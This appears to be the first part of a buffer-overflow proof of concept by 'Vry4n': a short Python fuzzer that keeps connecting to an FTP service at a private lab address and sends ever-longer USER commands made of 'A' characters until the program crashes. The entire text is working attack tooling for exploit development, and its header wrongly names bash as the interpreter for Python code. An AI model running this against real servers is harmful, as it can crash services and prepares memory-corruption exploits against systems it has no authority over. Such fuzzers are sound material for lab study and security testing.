#!/bin/bash
import socket

# Part 1 of proof of concept by Vry4n
# This script is intended to discover the size of the buffer

FUZZ = ""

# While true increase the variable FUZZ by adding 10 "A" until the program crashes
while True:
    FUZZ += "A" * 10
    print("Fuzzing with {} bytes".format(len(FUZZ)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(("192.168.0.5", 21))
    s.recv(1024)
    s.send(b"USER " + FUZZ.encode() + b"\r\n")
    s.close()

